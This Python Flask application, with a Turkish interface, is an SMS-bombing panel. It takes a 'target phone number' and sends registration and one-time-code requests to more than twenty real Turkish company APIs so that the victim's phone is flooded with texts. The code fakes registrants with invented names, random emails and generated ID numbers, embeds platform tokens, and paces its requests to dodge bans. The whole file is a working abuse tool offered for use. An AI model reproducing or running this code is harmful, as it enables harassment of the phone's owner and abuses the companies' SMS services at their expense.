from flask import Flask, request, Response, jsonify
import threading
import requests
import queue
import uuid
import time
import json
from random import choice, randint
from string import ascii_lowercase

app = Flask(__name__)

# Aktif web isteklerini takip etmek için kuyruk sözlüğü
tasks = {}

# HTML Arayüzü - Senin verdiğin Tailwind Tasarımı (Değişiklik gerekmez, tek dosyada birleşti)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jindex Studio | Sunucu Paneli</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #0b0c0e;
        }
        ::-webkit-scrollbar {
            width: 6px;
        }
        ::-webkit-scrollbar-track {
            background: #16181c;
        }
        ::-webkit-scrollbar-thumb {
            background: #2c3036;
            border-radius: 10px;
        }
        .fade-in {
            animation: fadeIn 0.6s ease-out forwards;
        }
        .slide-up {
            animation: slideUp 0.4s ease-out forwards;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.98); }
            to { opacity: 1; transform: scale(1); }
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body class="text-zinc-200 min-h-screen flex items-center justify-center p-4 selection:bg-zinc-700 selection:text-white">

    <div class="fade-in max-w-md w-full bg-[#121418] border border-zinc-800/60 rounded-2xl p-6 shadow-2xl shadow-black/40">
        
        <div class="text-center mb-8">
            <h1 class="text-xl font-semibold tracking-wide text-white">JINDEX STUDIO</h1>
            <p class="text-xs text-zinc-500 mt-1 uppercase tracking-widest font-medium">SMS Request System v2026</p>
        </div>

        <div class="space-y-4">
            <div>
                <label class="block text-xs font-medium text-zinc-400 mb-1.5 ml-1">Hedef Telefon Numarası</label>
                <input type="text" id="phoneInput" placeholder="5xxxxxxxx" maxlength="10"
                       class="w-full bg-[#181a20] border border-zinc-800 focus:border-zinc-600 rounded-xl px-4 py-3 text-sm text-white placeholder-zinc-600 outline-none transition-all duration-300 tracking-wider">
            </div>

            <button id="startBtn" onclick="startProcess()"
                    class="w-full bg-zinc-100 hover:bg-white text-zinc-950 font-medium text-sm py-3 px-4 rounded-xl transition-all duration-300 cursor-pointer shadow-lg shadow-white/5 active:scale-[0.99]">
                Sistemi Başlat
            </button>
        </div>

        <div id="monitorArea" class="hidden mt-8 border-t border-zinc-800/80 pt-6">
            <div class="flex items-center justify-between mb-3 px-1">
                <span class="text-xs font-semibold tracking-wider text-zinc-400 uppercase flex items-center gap-2">
                    <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
                    Canlı İzleme Monitörü
                </span>
                <span id="loader" class="text-[11px] text-zinc-500 font-medium animate-pulse">İstekler gönderiliyor...</span>
            </div>

            <div id="logConsole" class="w-full h-48 bg-[#181a20] border border-zinc-800/50 rounded-xl p-3 overflow-y-auto space-y-2 flex flex-col">
            </div>
        </div>

        <div class="mt-8 text-center">
            <p class="text-[10px] text-zinc-600 font-medium tracking-wide">&copy; 2026 Jindex Studio. Tüm hakları saklıdır.</p>
        </div>

    </div>

    <script>
        function startProcess() {
            const phoneInput = document.getElementById("phoneInput");
            const startBtn = document.getElementById("startBtn");
            const monitorArea = document.getElementById("monitorArea");
            const logConsole = document.getElementById("logConsole");
            const loader = document.getElementById("loader");

            if (phoneInput.value.length !== 10) {
                alert("Lütfen numarayı başında 0 olmadan 10 hane olarak girin.");
                return;
            }

            startBtn.disabled = true;
            startBtn.classList.add("opacity-50", "cursor-not-allowed");
            phoneInput.disabled = true;
            logConsole.innerHTML = ""; 
            monitorArea.classList.remove("hidden");
            loader.innerText = "İstekler gönderiliyor...";

            fetch("/api/start", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ phone: phoneInput.value })
            })
            .then(res => res.json())
            .then(data => {
                if (data.error) {
                    alert(data.error);
                    resetUI();
                    return;
                }
                
                const eventSource = new EventSource(`/api/stream/${data.task_id}`);
                
                eventSource.onmessage = function(event) {
                    const logData = JSON.parse(event.data);
                    
                    if (logData.status === "ping") return;

                    if (logData.status === "done") {
                        eventSource.close();
                        loader.innerText = "Tamamlandı";
                        loader.classList.remove("animate-pulse");
                        loader.classList.add("text-emerald-400");
                        resetUI();
                    } else {
                        const logRow = document.createElement("div");
                        logRow.className = "slide-up text-xs font-mono py-1 px-2.5 rounded-md flex items-center justify-between transition-all duration-300";
                        
                        if (logData.status === "success") {
                            logRow.className += " bg-zinc-900/40 text-emerald-400 border-l-2 border-emerald-500";
                        } else {
                            logRow.className += " bg-zinc-950/20 text-rose-500 border-l-2 border-rose-800";
                        }
                        
                        logRow.innerText = logData.msg;
                        logConsole.appendChild(logRow);
                        
                        logConsole.scrollTo({
                            top: logConsole.scrollHeight,
                            behavior: 'smooth'
                        });
                    }
                };
            })
            .catch(err => {
                alert("Sistem hatası oluştu.");
                resetUI();
            });
        }

        function resetUI() {
            document.getElementById("startBtn").disabled = false;
            document.getElementById("startBtn").classList.remove("opacity-50", "cursor-not-allowed");
            document.getElementById("phoneInput").disabled = false;
        }
    </script>
</body>
</html>
"""

class SendSms:
    def __init__(self, phone):
        self.phone = str(phone)
        rakam = [randint(1, 9)]
        for _ in range(8):
            rakam.append(randint(0, 9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((sum(rakam)) % 10)
        self.tc = "".join(map(str, rakam))
        self.mail = ''.join(choice(ascii_lowercase) for _ in range(22)) + "@gmail.com"

    # --- TÜM API SERVİSLERİN (smscy.py tabanlı) ---
    def KahveDunyasi(self):
        try:    
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            r = requests.post(url, json={"countryCode": "90", "phoneNumber": self.phone}, timeout=5)
            if r.json().get("processStatus") == "Success": return True
        except: pass
        return False
        
    def Wmf(self):
        try:
            r = requests.post("https://www.wmf.com.tr/users/register/", data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=5)
            if r.status_code == 202: return True
        except: pass
        return False
    
    def Bim(self):
        try:
            r = requests.post("https://bim.veesk.net:443/service/v1.0/account/login", json={"phone": self.phone}, timeout=5)
            if r.status_code == 200: return True
        except: pass
        return False

    def Englishhome(self):
        try:
            r = requests.post("https://www.englishhome.com:443/api/member/sendOtp", json={"Phone": self.phone, "XID": ""}, timeout=5)
            if r.json().get("isError") == False: return True
        except: pass
        return False
          
    def Suiste(self):
        try:
            r = requests.post("https://suiste.com:443/api/auth/code", data={"action": "register", "gsm": self.phone, "full_name": "Memati Bas", "password": "31MeMaTi31"}, timeout=5)
            if r.json().get("code") == "common.success": return True
        except: pass
        return False
                
    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=5)
            if r.status_code == 200: return True
        except: pass
        return False
            
    def Evidea(self):
        try:
            r = requests.post("https://www.evidea.com:443/users/register/", data={"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{self.phone}", "password": "31ABC..abc31", "confirm": "true", "sms_allowed": "true"}, timeout=5)      
            if r.status_code == 202: return True
        except: pass
        return False 

    def Ucdortbes(self):
        try:
            r = requests.post("https://api.345dijital.com:443/api/users/register", json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}, timeout=5)
            if r.json().get("error") != "E-Posta veya telefon zaten kayıtlı!": return True
        except: pass
        return False

    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            json_data = {"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
            r = requests.post(url, json=json_data, timeout=5)
            if r.json().get("data", {}).get("generateOtp") == True: return True
        except: pass
        return False

    def Naosstars(self):
        try:
            r = requests.post("https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350", json={"telephone": f"+90{self.phone}", "type": "register"}, timeout=5)
            if r.status_code == 200: return True
        except: pass
        return False

    def Koton(self):
        try:
            r = requests.post("https://www.koton.com:443/users/register/", data={"first_name": "Memati", "last_name": "Bas", "email": self.mail, "password": "31ABC..abc31", "phone": f"0{self.phone}", "confirm": "true", "sms_allowed": "true"}, timeout=5)
            if r.status_code == 202: return True
        except: pass
        return False

    def Hayatsu(self):
        try:
            r = requests.post("https://api.hayatsu.com.tr:443/api/SignUp/SendOtp", data={"mobilePhoneNumber": self.phone, "actionType": "register"}, timeout=5)
            if r.json().get("is_success") == True: return True
        except: pass
        return False

    def Hizliecza(self):
        try:
            r = requests.post("https://prod.hizliecza.net:443/mobil/account/sendOTP", json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}, timeout=5)
            if r.status_code == 200: return True
        except: pass
        return False

    def Metro(self):
        try:
            r = requests.post("https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend", json={"methodType": "2", "mobilePhoneNumber": self.phone}, timeout=5)
            if r.json().get("status") == "success": return True
        except: pass
        return False

    def File(self):
        try:
            r = requests.post("https://api.filemarket.com.tr:443/v1/otp/send", json={"mobilePhoneNumber": f"90{self.phone}"}, timeout=5)
            if r.json().get("responseType") == "SUCCESS": return True
        except: pass
        return False
            
    def Akasya(self):
        try:
            r = requests.post("https://akasyaapi.poilabs.com:443/v1/en/sms", headers={"X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5"}, json={"phone": self.phone}, timeout=5)
            if r.json().get("result") == "SMS sended succesfully!": return True
        except: pass
        return False
        
    def Akbati(self):
        try:
            r = requests.post("https://akbatiapi.poilabs.com:443/v1/en/sms", headers={"X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3"}, json={"phone": self.phone}, timeout=5)
            if r.json().get("result") == "SMS sended succesfully!": return True
        except: pass
        return False

    def Komagene(self):
        try:
            r = requests.post("https://gateway.komagene.com.tr:443/auth/auth/smskodugonder", headers={"Firmaid": "32"}, json={"FirmaId": 32, "Telefon": self.phone}, timeout=5)
            if r.json().get("Success") == True: return True
        except: pass
        return False
    
    def Porty(self):
        try:
            r = requests.post("https://panel.porty.tech:443/api.php?", json={"job": "start_login", "phone": self.phone}, timeout=5)
            if r.json().get("status") == "success": return True
        except: pass
        return False
    
    def Tasdelen(self):
        try:
            r = requests.post("https://tasdelen.sufirmam.com:3300/mobile/send-otp", json={"phone": self.phone}, timeout=5)
            if r.json().get("result") == True: return True
        except: pass
        return False

    def Uysal(self):
        try:
            r = requests.post("https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms", json={"phone_number": self.phone}, timeout=5)
            if r.status_code == 200: return True
        except: pass
        return False
    
    def Yapp(self):
        try:
            r = requests.post("https://yapp.com.tr:443/api/mobile/v1/register", json={"app_version": "1.1.5", "phone_number": self.phone, "firstname": "Memati", "lastname": "Bas", "email": self.mail}, timeout=5)
            if r.status_code == 200: return True
        except: pass
        return False
    
    def YilmazTicaret(self):
        try:
            r = requests.post("https://app.buyursungelsin.com:443/api/customer/form/checkx", data={"fonksiyon": "customer/form/checkx", "method": "POST", "telephone": f"0{self.phone}"}, timeout=5)
            if r.status_code == 200: return True
        except: pass
        return False

def run_sms_task(task_id, phone):
    worker = SendSms(phone)
    # Sınıftaki tüm servis fonksiyonlarını otomatik çek
    api_methods = [func for func in dir(SendSms) if callable(getattr(SendSms, func)) and not func.startswith("__")]
    q = tasks[task_id]
    
    for method_name in api_methods:
        func = getattr(worker, method_name)
        status = func()
        
        if status:
            q.put({"status": "success", "msg": f"Başarılı! {phone} --> {method_name.lower()}"})
        else:
            q.put({"status": "fail", "msg": f"Başarısız! {phone} --> {method_name.lower()}"})
            
        time.sleep(0.4) # API banlarını önlemek için hafif bekleme süresi
        
    q.put({"status": "done"})

@app.route('/')
def index():
    return HTML_TEMPLATE

@app.route('/api/start', methods=['POST'])
def start_api():
    data = request.get_json() or {}
    phone = data.get("phone")
    if not phone or len(phone) != 10:
        return jsonify({"error": "Geçersiz telefon numarası!"}), 400
        
    task_id = str(uuid.uuid4())
    tasks[task_id] = queue.Queue()
    
    t = threading.Thread(target=run_sms_task, args=(task_id, phone))
    t.daemon = True
    t.start()
    
    return jsonify({"task_id": task_id})

@app.route('/api/stream/<task_id>')
def stream_api(task_id):
    if task_id not in tasks:
        return "Görev Bulunamadı", 404
        
    def event_stream():
        q = tasks[task_id]
        while True:
            try:
                data = q.get(timeout=30)
                yield f"data: {json.dumps(data)}\n\n"
                if data.get("status") == "done":
                    del tasks[task_id]
                    break
            except queue.Empty:
                yield f"data: {json.dumps({'status': 'ping'})}\n\n"
                
    return Response(event_stream(), mimetype="text/event-stream")

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
